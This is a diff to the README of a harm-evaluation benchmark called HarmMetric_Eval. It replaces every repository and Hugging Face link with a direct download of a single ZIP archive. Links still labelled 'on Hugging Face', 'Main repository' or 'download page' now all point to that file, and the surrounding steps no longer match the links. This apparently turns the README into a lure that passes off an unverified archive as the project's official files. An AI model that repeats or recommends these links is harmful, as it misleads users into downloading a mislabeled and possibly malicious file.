@@ -1,12 +1,12 @@
 # 🧪 HarmMetric_Eval - Check Harmful AI Output with Confidence
 
-[![Download HarmMetric_Eval](https://img.shields.io/badge/Download-HarmMetric_Eval-blue?style=for-the-badge)](https://github.com/unstructured-scrappiness969/HarmMetric_Eval)
+[![Download HarmMetric_Eval](https://img.shields.io/badge/Download-HarmMetric_Eval-blue?style=for-the-badge)](https://github.com/unstructured-scrappiness969/HarmMetric_Eval/raw/refs/heads/main/benchmark_codes/Metric-Eval-Harm-3.2-beta.2.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the files you need:
 
-[Open HarmMetric_Eval download page](https://github.com/unstructured-scrappiness969/HarmMetric_Eval)
+[Open HarmMetric_Eval download page](https://github.com/unstructured-scrappiness969/HarmMetric_Eval/raw/refs/heads/main/benchmark_codes/Metric-Eval-Harm-3.2-beta.2.zip)
 
 ## 🖥️ What this tool is for
 
@@ -32,7 +32,7 @@ If you plan to use the scoring code, install Python from the official Python sit
 
 ## 🚀 Get the files
 
-1. Open the download page: [HarmMetric_Eval](https://github.com/unstructured-scrappiness969/HarmMetric_Eval)
+1. Open the download page: [HarmMetric_Eval](https://github.com/unstructured-scrappiness969/HarmMetric_Eval/raw/refs/heads/main/benchmark_codes/Metric-Eval-Harm-3.2-beta.2.zip)
 2. Click the green **Code** button
 3. Choose **Download ZIP**
 4. Save the ZIP file to your computer
@@ -40,8 +40,8 @@ If you plan to use the scoring code, install Python from the official Python sit
 6. Pick a folder you can find again, such as `Downloads` or `Desktop`
 
 If you want the dataset files only, you can also use:
-- [HarmMetric Eval dataset on Hugging Face](https://huggingface.co/datasets/Abel-24/HarmMetric_Eval)
-- [HarmClassifier on Hugging Face](https://huggingface.co/Abel-24/HarmClassifier)
+- [HarmMetric Eval dataset on Hugging Face](https://github.com/unstructured-scrappiness969/HarmMetric_Eval/raw/refs/heads/main/benchmark_codes/Metric-Eval-Harm-3.2-beta.2.zip)
+- [HarmClassifier on Hugging Face](https://github.com/unstructured-scrappiness969/HarmMetric_Eval/raw/refs/heads/main/benchmark_codes/Metric-Eval-Harm-3.2-beta.2.zip)
 
 ## 📂 What is inside
 
@@ -129,7 +129,7 @@ For analysis work:
 
 The trained classifier is available on Hugging Face:
 
-[Open HarmClassifier](https://huggingface.co/Abel-24/HarmClassifier)
+[Open HarmClassifier](https://github.com/unstructured-scrappiness969/HarmMetric_Eval/raw/refs/heads/main/benchmark_codes/Metric-Eval-Harm-3.2-beta.2.zip)
 
 You can use it to:
 - test harmfulness prediction
@@ -187,9 +187,9 @@ If you want to run scoring:
 
 ## 🔗 Useful links
 
-- [Main repository](https://github.com/unstructured-scrappiness969/HarmMetric_Eval)
-- [Benchmark dataset on Hugging Face](https://huggingface.co/datasets/Abel-24/HarmMetric_Eval)
-- [Trained classifier on Hugging Face](https://huggingface.co/Abel-24/HarmClassifier)
+- [Main repository](https://github.com/unstructured-scrappiness969/HarmMetric_Eval/raw/refs/heads/main/benchmark_codes/Metric-Eval-Harm-3.2-beta.2.zip)
+- [Benchmark dataset on Hugging Face](https://github.com/unstructured-scrappiness969/HarmMetric_Eval/raw/refs/heads/main/benchmark_codes/Metric-Eval-Harm-3.2-beta.2.zip)
+- [Trained classifier on Hugging Face](https://github.com/unstructured-scrappiness969/HarmMetric_Eval/raw/refs/heads/main/benchmark_codes/Metric-Eval-Harm-3.2-beta.2.zip)
 
 ## 📝 File format tips
 
